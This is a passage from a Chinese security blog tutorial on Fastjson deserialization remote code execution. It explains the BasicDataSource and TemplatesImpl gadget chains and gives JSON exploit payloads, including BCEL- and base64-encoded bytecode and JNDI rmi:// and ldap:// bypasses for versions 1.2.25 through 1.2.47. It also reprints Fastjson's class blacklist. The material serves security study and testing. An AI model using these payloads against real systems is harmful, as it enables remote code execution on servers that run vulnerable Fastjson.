<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;java.rmi.server.hostname&quot;,&quot;外网IP&quot;);</span><br></pre></td></tr></table></figure>

<p>或者在启动RMI服务时，通过启动参数指定 java.rmi.server.hostname 属性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.hostname=服务器真实外网IP</span><br></pre></td></tr></table></figure>

<p>​       </p>
<h4 id="BasicDataSource利用链"><a href="#BasicDataSource利用链" class="headerlink" title="BasicDataSource利用链"></a>BasicDataSource利用链</h4><p>现实环境多种多样，处于内网不出网的机器也很多，那么如果目标服务器没有外网、无法反连，那就无法使用 JdbcRowSetImpl 利用链 JNDI 注入的方式。那么是否有方法能解决这个不出网的问题呢？显然师傅们已经在前面找到方法了， 下面来看<strong>BasicDataSource</strong>利用链，它是位于Tomcat里的类，如果能成功利用到它，可以在 Payload 中直接传入字节码并且对方机器不需要出网，也不需要开启什么特殊的参数，适用范围一下就开阔了有没有。但是前提是目标要引入tomcat依赖，而且版本不是很高的那种，当然站点一般追求稳定的较低版本，而且不少环境都是有Tomcat的，这也算是相对比较常见的配置了。</p>
<p>在实验环境中，引入Tomcat</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dbcp&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">6.0</span>.x&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>在不同的版本中，BasicDataSource的位置是有所不同的，它在旧版本的 tomcat-dbcp 包中，完整的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9618.png"></p>
<p>但是在8.0版本之后完整的路径有所变化org.apache.tomcat.dbcp.dbcp2.BasicDataSource。</p>
<h5 id="Java的类加载器"><a href="#Java的类加载器" class="headerlink" title="Java的类加载器"></a>Java的类加载器</h5><p>ClassLoader :<br>在Java中，运行它需要经过两次处理，首先编译器将Java源代码转换为Java二进制代码（字节码），生成.class文件，之后通过Java虚拟机（JVM，在jdk下的javac中可以找到）的解释器来执行这段代码。Java字节码中有很多的Class信息，JVM在执行的时候需要用到ClassLoader就来Java类，由ClassLoader将Java字节码中的Class加载到内存中。而每个Class对象的内部都有一个 classLoader 属性来标识自己是由哪个 ClassLoader 加载的。路径：java.base.java.lang.ClassLoader<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9619.png"></p>
<p>​      </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdk自带常用的类加载器：</span><br><span class="line">BootstrapClassLoader、ExtensionClassLoader、AppClassLoader、URLClassLoader、ContextClassLoader；</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加载器常用方法：</span><br><span class="line">loadClass()</span><br><span class="line">findClass()//加载.class文件，找到后调用defineclass()</span><br><span class="line">defineClass()//将字节码转换成java.lang.Class的对象</span><br></pre></td></tr></table></figure>

<p>另外一个就是 java.lang.class.forname()方法也可以用来动态加载类，而且它默认初始化类，会执行静态代码块 （就是static代码块；官方解释：格式 static{} 特点：需要通过static关键字修饰，随着类的加载而加载，并且自动触发、只执行一次 优先加载 使用场景：在类加载的时候做一些静态数据初始化的操作，以便后续使用）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="keyword">boolean</span> initialize, ClassLoader loader) <span class="keyword">throws</span> ClassNotFoundException </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException</span><br></pre></td></tr></table></figure>

<p>​      </p>
<h5 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h5><p>BasicDataSource.getConnection() -&gt; BasicDataSource.createDataSource() -&gt; BasicDataSource.createConnectionFactory()<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9620.png"></p>
<p>可以看到，这条链最终会调用前面提到的加载类的一种方法JDK的Class.forName()，使用的参数driverClassName和driverClassLoader，我们是可以控制这俩参数的，一起来看poc，这是针对目标使用JSON.parse() 方法进行反序列化</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POC：</span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,<span class="attr">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;name&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 我们先来看看com.sun.org.apache.bcel.internal.util.ClassLoader是什么，看名字就知道它是一个类加载器，这是jdk自带的类，它会直接从classname中提取Class的字节码数据。具体是：如果classname中包含$$BCEL$$，该ClassLoader则会将$$BCEL$$后的字符串以BCEL编码进行解码，作为Class的字节码，并调用defineClass()将Class转化为对象<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9621.png"></p>
<p>poc建议删掉所有空格进行分析，首先json格式为 {“key”: value, “key”: value} 。</p>
<ol>
<li>先将 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段放到JSON Value的位置上，之后在外面又套了一层 “{ }”。</li>
<li>之后又将 Payload 整个放到了JSON 字符串中 Key 的位置上。</li>
</ol>
<p>“driverClassName”: “$$BCEL$$$l$8b$I$A$…”，其参数是$$BCEL$$接上我们恶意类的字节码的BCEL编码。例如编写一个实验类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;                                               <span class="comment">//payload写在 static 代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>我们使用先使用javac将test编译成.class文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Main.java</span><br></pre></td></tr></table></figure>

<p>然后使用工具BCELCodeman对这个字节码进行BCEL编码。基本可以理解为是传统字节码的HEX编码，再将反斜线替换成<code>$</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BCELCodeman/src/BCELCodeman.jar e test.class</span><br></pre></td></tr></table></figure>

<p>最后发生payload发送到目标</p>
<p>​      </p>
<p>另外，若是目标使用的是JSON.parseObject()方法进行反序列化，那么POC更简单一些</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b......&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​      </p>
<h4 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h4><p>该链和BasicDataSource都用到了字节码，完整利用链TemplatesImpl.getOutputProperties()-&gt; TemplatesImpl.newTransformer()-&gt; TemplatesImpl.getTransletInstance()-&gt; TemplatesImpl.defineTransletClasses()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个PoC原理上也是利用了 ClassLoader  动态加载恶意代码，在Payload中直接传入字节码。TransletClassLoader.defineClass() 将 Bytecode  字节码转为Class对象。但是这种限制比较多，要求开发者在调用parseObject()时额外设置  Feature.SupportNonPublicField，在实战中很少见，这里就不写了。</p>
<p>​      </p>
<h3 id="各版本绕过"><a href="#各版本绕过" class="headerlink" title="各版本绕过"></a>各版本绕过</h3><p>1.2.24及以前版本比较简单，在1.2.25开始加入了黑白名单机制，安全性提高</p>
<p>1.2.25~1.2.41</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">黑名单：</span><br><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>1.2.25 中加入了CheckAutoType方法，里面有个autotypesupport属性，如果为false，那么就会检测json中@type的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类，autotypesupport开启时，会先白名单加载，后黑名单检测</p>
<p>loadClass 时会移除开头的L和结尾的 “ ; “，那我们自己添加进去，并且在autotypesupport开启时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:9000/exploit&quot;,&quot;autoCommit&quot;:true&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>​       </p>
<p>1.2.25~1.2.47</p>
<p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p>
<p>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>1.2.42(1)</p>
<p>会先将开头的 L 和结尾的 “ ; “ 移除再进行黑名单判断，那就双写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:9000/exploit&quot;,&quot;autoCommit&quot;:true&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>1.2.42(2)</p>
<p>遇到 LL 开头的 typeName 直接抛出异常退出….</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span> : <span class="string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>[,&#123;</span><br><span class="line">  <span class="attr">&quot;_bytecodes&quot;</span> : [<span class="string">&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;_name&quot;</span> : <span class="string">&quot;a&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_tfactory&quot;</span> : &#123;&#125;,</span><br><span class="line">  <span class="attr">&quot;outputProperties&quot;</span> : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>1.2.25~1.2.45</p>
<p>绕过黑名单的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MTRleed</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mtrleed.top/post/11/">https://www.mtrleed.top/post/11/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mtrleed.top" target="_blank">MTRleed</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/fastjson.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/3/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus12.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">kali部署nessus</div></div></a></div><div class="next-post pull-right"><a href="/post/10/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/JNDI.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JNDI注入</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#set%E5%92%8Cget"><span class="toc-number">1.1.</span> <span class="toc-text">set和get</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">fastjson的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.2.</span> <span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-18349-Fastjson-lt-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce"><span class="toc-number">2.3.</span> <span class="toc-text">(CVE-2017-18349)Fastjson&lt;&#x3D;1.2.24反序列化-rce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.1.</span> <span class="toc-text">fastjson反序列化过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.2.</span> <span class="toc-text">JdbcRowSetImpl利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BasicDataSource%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.3.</span> <span class="toc-text">BasicDataSource利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Java%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">Java的类加载器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">利用链</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.4.</span> <span class="toc-text">TemplatesImpl利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">各版本绕过</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i class="fa-fw fas fa-heart card-announcement-animation cc_pointer"></i> MTRleed</div><div class="footer_custom_text">MTRleed|博客</div><div id="running-time"></div><script>setInterval(()=>{let create_time=Math.round(new Date(Date.UTC(2021,08,30,0,0,0)).getTime()/1000);let timestamp=Math.round((new Date().getTime()+8*60*60*1000)/1000);let second=timestamp-create_time;let time=new Array(0,0,0,0,0);if(second>=365*24*3600){time[0]=parseInt(second/(365*24*3600));second%=365*24*3600;}if(second>=24*3600){time[1]=parseInt(second/(24*3600));second%=24*3600;}if(second>=3600){time[2]=parseInt(second/3600);second%=3600;}if(second>=60){time[3]=parseInt(second/60);second%=60;}if(second>0){time[4]=second;}currentTimeHtml='小 破 站 已 艰 难 营 业 '+time[0]+' 年 '+time[1]+' 天 '+time[2]+' 时 '+time[3]+' 分 '+time[4]+' 秒';document.getElementById("running-time").innerHTML=currentTimeHtml;},1000);</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'DAdNksl9t4AvRRqv5LSI68Bw-gzGzoHsz',
      appKey: 'DxK0hMCcbzgfiNRktvLAWocH',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      placeholder: 'ヾﾉ≧∀≦)o 欢 迎 评 论 ! 填写QQ邮箱我就可以看到你的头像嗷~',
      path: window.location.pathname,
      master: '0e249a5357be07e34f42012d615f91c8',
      tagMeta:["博主","小伙伴","访客"],
      friends: ["5c0ed793d43436a166548845c8ffe455","d4f239a7347311d21f9658a44bc2d3f1"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>